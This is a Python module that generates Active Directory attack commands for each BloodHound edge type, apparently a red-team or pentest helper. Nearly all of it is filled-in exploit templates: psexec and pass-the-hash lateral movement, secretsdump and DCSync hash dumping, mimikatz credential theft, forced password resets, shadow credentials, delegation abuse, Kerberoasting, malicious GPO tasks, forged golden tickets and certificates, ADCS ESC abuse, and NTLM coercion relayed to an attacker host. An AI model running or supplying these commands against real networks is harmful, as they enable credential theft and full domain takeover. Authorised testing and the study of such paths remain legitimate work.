"""Exploit command suggestions for each BloodHound edge type.

get_commands() returns (CommandSet, next_actor) where next_actor is the
identity the attacker operates as AFTER exploiting this edge.
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class CommandSet:
    description: str
    commands: list[str] = field(default_factory=list)

    @property
    def has_commands(self) -> bool:
        return bool(self.commands)


def _fqdn_to_dn(fqdn: str) -> str:
    return ",".join(f"DC={part}" for part in fqdn.split("."))


_DOMAIN_KIND_HINTS = ("domains",)


def _parse(label: str, kind: str = "") -> dict:
    """Extract short name, domain, and FQDN from a display name.

    `kind` (optional) — if "domains", the whole label is treated as the domain
    so that "HTB.LOCAL" yields domain="HTB.LOCAL" instead of "LOCAL".
    """
    label = (label or "").strip()
    if "@" in label:
        short, domain = label.rsplit("@", 1)
        return {"short": short, "domain": domain, "fqdn": label}
    if kind in _DOMAIN_KIND_HINTS and "." in label:
        return {"short": label.split(".")[0].upper(), "domain": label, "fqdn": label}
    if "." in label:
        parts = label.split(".")
        return {"short": parts[0].upper(), "domain": ".".join(parts[1:]), "fqdn": label}
    return {"short": label, "domain": "<DOMAIN>", "fqdn": label}


def _computer_identity(dst_name: str) -> str:
    """Return a computer account identity in COMPUTER$@DOMAIN form so that
    _parse() recovers the sAMAccountName (with the trailing '$') correctly.
    """
    p = _parse(dst_name)
    return f"{p['short']}$@{p['domain']}"


def _next_actor(
    rel_type: str,
    dst_name: str,
    dst_kind: str,
    current: str,
) -> str:
    """Return the identity the attacker operates as after this hop."""
    user_kinds = ("users", "")

    if rel_type in ("ForceChangePassword", "AddKeyCredentialLink"):
        return _computer_identity(dst_name) if dst_kind == "computers" else dst_name
    if rel_type in ("AllowedToDelegate", "AllowedToAct", "WriteAccountRestrictions"):
        dst = _parse(dst_name, dst_kind)
        return f"Administrator@{dst['domain']}"
    if rel_type in ("GenericWrite", "GenericAll", "AllExtendedRights"):
        return _computer_identity(dst_name) if dst_kind == "computers" else (
            dst_name if dst_kind in user_kinds else current
        )
    if rel_type in ("ReadLAPSPassword", "SyncLAPSPassword"):
        # Local admin password → on-host SYSTEM → AD auth uses the machine account.
        if dst_kind == "computers":
            return _computer_identity(dst_name)
        return current
    if rel_type == "HasSession":
        # HasSession goes computer→user (BH CE schema). After this hop the
        # attacker has stolen the session and operates as the destination user.
        if dst_kind in user_kinds:
            return dst_name
        return current
    if rel_type in ("AdminTo", "SQLAdmin"):
        # AdminTo via psexec → SYSTEM; SQLAdmin → xp_cmdshell → SYSTEM.
        # SYSTEM on a domain-joined host = machine account for AD auth.
        if dst_kind == "computers":
            return _computer_identity(dst_name)
        return current
    if rel_type in ("CanPSRemote", "CanRDP", "ExecuteDCOM"):
        # Interactive session keeps the actor's user context. Onward AD steps
        # still run as the original actor unless the operator escalates to
        # SYSTEM locally (then the machine account would be used — out of scope
        # for the synthesized identity here).
        return current
    return current  # no identity change


def get_commands(
    rel_type: str,
    src_id: str,
    dst_id: str,
    src_name: str = "",
    dst_name: str = "",
    src_kind: str = "",
    dst_kind: str = "",
    actor: str = "",
) -> tuple[CommandSet, str]:
    """Return (CommandSet, next_actor) for a given edge.

    actor: display name of the identity currently in use.
           Defaults to src_name if empty.
    """
    act = _parse(actor or src_name, src_kind)
    src = _parse(src_name or src_id, src_kind)
    dst = _parse(dst_name or dst_id, dst_kind)

    A  = act["short"]   # attacker short name
    D  = act["domain"]  # attacker domain
    SF = src["fqdn"]    # source FQDN / display name
    T  = dst["short"]   # target short name
    TF = dst["fqdn"]    # target FQDN

    PASS = "<SRC_PASSWORD>"
    HASH = "<NTLM_HASH>"
    DC   = "<DC_IP>"

    na = _next_actor(rel_type, dst_name or dst_id, dst_kind, actor or src_name)

    match rel_type:

        case "MemberOf" | "Contains":
            return CommandSet("Structural relationship — no action required."), na

        case "AdminTo":
            return CommandSet(
                f"Local admin on {TF} — code exec as SYSTEM, then dump local secrets.",
                [
                    "# Code exec (psexec gives SYSTEM, wmiexec/winrm give the calling user):",
                    f"impacket-psexec '{D}/{A}:{PASS}@{TF}'",
                    f"impacket-wmiexec '{D}/{A}:{PASS}@{TF}'",
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    "# Pass-the-hash:",
                    f"impacket-psexec '{D}/{A}@{TF}' -hashes ':{HASH}'",
                    "# Once SYSTEM — dump SAM, LSA secrets, cached creds, LSASS:",
                    f"impacket-secretsdump '{D}/{A}:{PASS}@{TF}'",
                    "# On-host:",
                    "# reg save HKLM\\SAM sam.sav  &&  reg save HKLM\\SECURITY sec.sav  &&  reg save HKLM\\SYSTEM sys.sav",
                    "# mimikatz: privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam ; lsadump::secrets",
                ],
            ), na

        case "CanRDP":
            return CommandSet(
                f"RDP access to {TF}.",
                [f"xfreerdp /v:{TF} /u:'{A}' /p:'{PASS}' /d:{D} /cert-ignore"],
            ), na

        case "CanPSRemote":
            return CommandSet(
                f"WinRM / PSRemote access to {TF}.",
                [
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    f"evil-winrm -i {TF} -u '{A}' -H '{HASH}'",
                ],
            ), na

        case "ExecuteDCOM":
            return CommandSet(
                f"DCOM lateral movement to {TF}.",
                [f"impacket-dcomexec -object MMC20 '{D}/{A}:{PASS}@{TF}' 'cmd.exe /c whoami'"],
            ), na

        case "SQLAdmin":
            return CommandSet(
                f"SQL Server admin on {TF}.",
                [
                    f"impacket-mssqlclient '{D}/{A}:{PASS}@{TF}' -windows-auth",
                    "# In mssqlclient: EXEC xp_cmdshell 'whoami'",
                ],
            ), na

        case "HasSession":
            return CommandSet(
                f"{SF} has an active session for {TF}. Connect to {SF} and steal the token/TGT.",
                [
                    f"impacket-psexec '{D}/{A}:{PASS}@{SF}'",
                    f"impacket-wmiexec '{D}/{A}:{PASS}@{SF}'",
                    "# Once on the host — dump sessions:",
                    "# mimikatz: sekurlsa::logonpasswords",
                    "# Rubeus:   Rubeus.exe dump /nowrap",
                ],
            ), na

        case "DCSync":
            return CommandSet(
                "DCSync — dump all domain hashes.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    "# Pass-the-hash:",
                    f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    "# On-host (Mimikatz):",
                    f"# lsadump::dcsync /domain:{D} /all /csv",
                ],
            ), na

        case "GetChanges" | "GetChangesAll":
            missing = "GetChangesAll" if rel_type == "GetChanges" else "GetChanges"
            return CommandSet(
                f"{rel_type} alone on {TF} — NOT exploitable for DCSync. "
                f"You also need {missing} on the same domain.",
                [
                    "# DCSync requires BOTH GetChanges AND GetChangesAll on the domain.",
                    f"# You currently have only {rel_type}; missing: {missing}.",
                    f"# Find a way to acquire {missing} (e.g., compromise another principal that holds it),",
                    "# or rely on a different escalation path.",
                ],
            ), na

        case "GetChangesInFilteredSet":
            return CommandSet(
                f"GetChangesInFilteredSet on {TF} — NOT a DCSync path. "
                f"This right only grants replication of the filtered attribute set "
                f"(RODC scenario) and does NOT substitute for GetChanges.",
                [
                    "# This right alone does not let you dump domain secrets.",
                    "# DCSync still requires GetChanges + GetChangesAll on the domain.",
                ],
            ), na

        case "GenericAll":
            if dst_kind in ("users", ""):
                return CommandSet(
                    f"Full control over user {TF} — reset password, shadow creds.",
                    [
                        "# Option 1 — force password reset:",
                        f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                        "# Option 2 — shadow credentials:",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    ],
                ), na
            elif dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Full control over domain {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                        "# Pass-the-hash variant:",
                        f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    ],
                ), na
            elif dst_kind == "computers":
                return CommandSet(
                    f"Full control over computer {TF} — RBCD or shadow credentials.",
                    [
                        "# Option 1 — Resource-Based Constrained Delegation (needs MachineAccountQuota>0):",
                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                        f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
                        "export KRB5CCNAME=administrator.ccache",
                        f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                        "# Option 2 — shadow credentials (any case, no MAQ needed):",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}$' --action add --dc-ip {DC}",
                    ],
                ), na
            else:
                return CommandSet(
                    f"Full control over group {TF} — add member.",
                    [
                        f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    ],
                ), na

        case "AllExtendedRights":
            if dst_kind == "domains":
                return CommandSet(
                    f"All extended rights on domain {TF} — includes DCSync.",
                    [
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                        "# Pass-the-hash variant:",
                        f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    ],
                ), na
            return CommandSet(
                f"All extended rights on {TF} — includes ForceChangePassword.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                ],
            ), na

        case "AddMember" | "AddSelf":
            return CommandSet(
                f"Add a controlled user to group {TF}.",
                [
                    f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    "# PowerView:",
                    f"Add-DomainGroupMember -Identity '{T}' -Members '{A}' -Credential $Cred",
                ],
            ), na

        case "ForceChangePassword":
            return CommandSet(
                f"Force-reset the password of {TF} — no current password needed.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                    "# PowerView:",
                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Credential $Cred",
                ],
            ), na

        case "GenericWrite":
            T_sam = f"{T}$" if dst_kind == "computers" else T
            return CommandSet(
                f"Generic write on {TF} — shadow credentials or WriteSPN + Kerberoast.",
                [
                    "# Option 1 — shadow credentials:",
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                    "# Option 2 — write fake SPN then Kerberoast:",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T_sam}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
                    "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            ), na

        case "WriteSPN":
            return CommandSet(
                f"Write SPN on {TF} then Kerberoast.",
                [
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
                    "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            ), na

        case "Owns" | "WriteOwner":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Take ownership of {TF}, then grant DCSync rights.",
                    [
                        f"owneredit.py -action write -new-owner '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    ],
                ), na
            return CommandSet(
                f"Take ownership of {TF}, then grant yourself FullControl.",
                [
                    f"owneredit.py -action write -new-owner '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                ],
            ), na

        case "WriteDacl":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Modify DACL on {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        "# PowerView (TargetIdentity = domain DN):",
                        f"Add-DomainObjectAcl -TargetIdentity '{dn}' -PrincipalIdentity '{A}' -Rights DCSync -Credential $Cred",
                        "# Then dump all hashes:",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    ],
                ), na
            return CommandSet(
                f"Modify DACL on {TF} — grant yourself FullControl.",
                [
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    "# PowerView:",
                    f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{A}' -Rights All -Credential $Cred",
                ],
            ), na

        case "ReadLAPSPassword" | "SyncLAPSPassword":
            return CommandSet(
                f"Read the LAPS local admin password for {TF}.",
                [
                    f"impacket-GetLAPSPassword '{D}/{A}:{PASS}@{DC}' -computer '{T}'",
                    f"pyLAPS --action get -c '{T}' -d {D} -u '{A}' -p '{PASS}' --dc-ip {DC}",
                    "# PowerShell:",
                    f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
                ],
            ), na

        case "AllowedToDelegate":
            return CommandSet(
                f"Constrained delegation — impersonate Administrator on {TF}.",
                [
                    "# Note: SPN must match an entry in msDS-AllowedToDelegateTo (often cifs/, host/, http/).",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/{A}:{PASS}' -dc-ip {DC}",
                    "export KRB5CCNAME=administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case "AllowedToAct" | "WriteAccountRestrictions":
            return CommandSet(
                f"Resource-Based Constrained Delegation (RBCD) on {TF}.",
                [
                    "# 1. Create a controlled computer account (needs MachineAccountQuota>0):",
                    f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                    f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
                    f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                    "# 3. Get a service ticket as Administrator:",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
                    "export KRB5CCNAME=administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case "AddKeyCredentialLink":
            T_sam = f"{T}$" if dst_kind == "computers" else T
            return CommandSet(
                f"Shadow credentials on {TF} — add key credential, obtain TGT.",
                [
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
                    "# pywhisker outputs the gettgtpkinit command, e.g.:",
                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T_sam}' '{T}.ccache'",
                    f"export KRB5CCNAME='{T}.ccache'",
                    f"impacket-secretsdump -k -no-pass '{D}/{T_sam}@{DC}'",
                ],
            ), na

        case "GPLink":
            return CommandSet(
                f"GPO linked to {TF} — push malicious scheduled task.",
                [
                    f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'update'",
                    "# Or SharpGPOAbuse:",
                    f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {A} --GPOName '<GPO_NAME>'",
                ],
            ), na

        case "TrustedBy" | "SameForestTrust" | "CrossForestTrust":
            return CommandSet(
                f"Domain trust — {TF} trusts the current domain. Forge inter-realm TGT (SID-history attack).",
                [
                    "# 1. Get the krbtgt hash of the source domain (used to forge a Golden TGT with extra-sid):",
                    f"impacket-secretsdump -just-dc-user '{D}\\krbtgt' '{D}/{A}:{PASS}@{DC}'",
                    "# 2. Forge a Golden TGT impersonating Administrator with extra-sid pointing to target's DA SID:",
                    f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<SRC_DOMAIN_SID>' -domain {D} -extra-sid '<DST_DOMAIN_SID>-519' -spn 'krbtgt/{TF}' Administrator",
                    "export KRB5CCNAME=Administrator.ccache",
                    f"impacket-psexec -k -no-pass '{TF}/Administrator@<DST_DC_FQDN>'",
                ],
            ), na

        case "DCFor":
            return CommandSet(
                f"{SF} is a DC for {TF} — use it as the DC endpoint for DCSync.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{SF}'",
                ],
            ), na

        case "Enroll" | "AutoEnroll":
            return CommandSet(
                f"Enrollment right on certificate template/CA {TF}. Combine with a vulnerable template (ESC1/2/3/...) for escalation.",
                [
                    "# Find vulnerable templates:",
                    f"certipy-ad find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
                    "# Then request a cert (ESC1 example, requires SAN supplyable):",
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@{D}' -dc-ip {DC}",
                ],
            ), na

        case "WritePKINameFlag" | "WritePKIEnrollmentFlag":
            return CommandSet(
                f"Modify enrollment/name flag on template {TF} to enable SAN-based impersonation (ESC4 → ESC1).",
                [
                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -save-old",
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                    "# Restore the template afterwards:",
                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -configuration '{T}.json'",
                ],
            ), na

        case "ManageCA" | "ManageCertificates" | "DelegatedEnrollmentAgent":
            return CommandSet(
                f"CA management/officer right on {TF} — approve a denied request or issue arbitrary certs.",
                [
                    "# Inspect CA and find issued/pending requests:",
                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-requests -dc-ip {DC}",
                    "# Approve a denied request:",
                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -issue-request <REQ_ID> -dc-ip {DC}",
                    "# Or add yourself as Officer to enable approve/issue:",
                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -add-officer '{A}' -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC1":
            return CommandSet(
                f"ADCS ESC1 — vulnerable template on {TF} allows arbitrary SAN. Issue a cert as Administrator.",
                [
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC3":
            return CommandSet(
                f"ADCS ESC3 — Enrollment Agent template on {TF}. Request agent cert then on-behalf-of Administrator.",
                [
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template 'User' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC4":
            return CommandSet(
                f"ADCS ESC4 — write rights over template {TF}. Make it ESC1-vulnerable then enroll.",
                [
                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -save-old",
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                    "# Restore template:",
                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -configuration '{T}.json'",
                ],
            ), na

        case "ADCSESC6a" | "ADCSESC6b":
            return CommandSet(
                f"ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA {TF}. Any client cert template enrollment lets you supply a SAN.",
                [
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '{T}' -template 'User' -upn 'Administrator@{D}' -dc-ip {DC}",
                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC9a" | "ADCSESC9b":
            return CommandSet(
                f"ADCS ESC9 — no security extension on template {TF}. Combine with GenericWrite on victim to swap UPN/dnsHostName.",
                [
                    "# 1. Set victim's UPN to Administrator (or dnsHostName for ESC9b):",
                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                    "# 2. Enroll using victim:",
                    f"certipy-ad req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
                    "# 3. Restore UPN, then auth:",
                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                    f"certipy-ad auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC10a" | "ADCSESC10b":
            return CommandSet(
                "ADCS ESC10 — weak certificate mapping on DC. Same workflow as ESC9 (UPN/dnsHostName swap).",
                [
                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                    f"certipy-ad req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                    f"certipy-ad auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC13":
            return CommandSet(
                "ADCS ESC13 — issuance policy linked to a group. Cert auth grants implicit group membership.",
                [
                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
                    f"certipy-ad auth -pfx '{A}.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "GoldenCert":
            return CommandSet(
                f"Golden Certificate — CA private key compromise on {TF}. Forge any user/computer cert offline.",
                [
                    "# 1. Extract CA cert+key from a compromised CA host (mimikatz/SharpDPAPI/certipy):",
                    f"certipy-ad ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{T}' -dc-ip {DC}",
                    "# 2. Forge a cert as Administrator:",
                    f"certipy-ad forge -ca-pfx '{T}.pfx' -upn 'Administrator@{D}' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "WriteGPLink":
            return CommandSet(
                f"WriteGPLink on {TF} — link a malicious GPO to push a payload (scheduled task/local-admin).",
                [
                    "# 1. Create a GPO under your control or compromise an existing one:",
                    "# 2. Link it via gpLink attribute on the OU/domain:",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '[LDAP://CN={{<GPO_GUID>}},CN=Policies,CN=System,{_fqdn_to_dn(D)};0]'",
                    "# 3. Push the payload via pygpoabuse:",
                    f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'update'",
                ],
            ), na

        case "OwnsLimitedRights" | "WriteOwnerLimitedRights":
            return CommandSet(
                f"Limited ownership on {TF} (post-2024 Windows hardening). You can still grant FullControl on most objects.",
                [
                    f"owneredit.py -action write -new-owner '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                ],
            ), na

        case "CoerceAndRelayNTLMToSMB" | "CoerceAndRelayNTLMToLDAP" | "CoerceAndRelayNTLMToLDAPS" | "CoerceAndRelayNTLMToADCS":
            relay_target = {
                "CoerceAndRelayNTLMToSMB":   ("smb",   "smb://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToLDAP":  ("ldap",  "ldap://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToLDAPS": ("ldaps", "ldaps://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToADCS":  ("http",  "http://<CA_HOST>/certsrv/certfnsh.asp"),
            }[rel_type]
            return CommandSet(
                f"Coerce {TF} to authenticate, relay NTLM to {relay_target[0].upper()}.",
                [
                    "# 1. Start ntlmrelayx targeting the relay endpoint:",
                    f"impacket-ntlmrelayx -t {relay_target[1]} -smb2support" + (
                        " --escalate-user '" + A + "'" if relay_target[0] == "ldap" or relay_target[0] == "ldaps"
                        else " --adcs --template 'DomainController' " if relay_target[0] == "http" else ""),
                    "# 2. Trigger the coercion (PetitPotam / Coercer / printerbug):",
                    f"coercer coerce -u '{A}' -p '{PASS}' -d {D} -l <ATTACKER_IP> -t {TF}",
                ],
            ), na

        case _:
            return CommandSet(
                f"Edge type '{rel_type}' — consult BloodHound documentation for exploitation steps."
            ), na
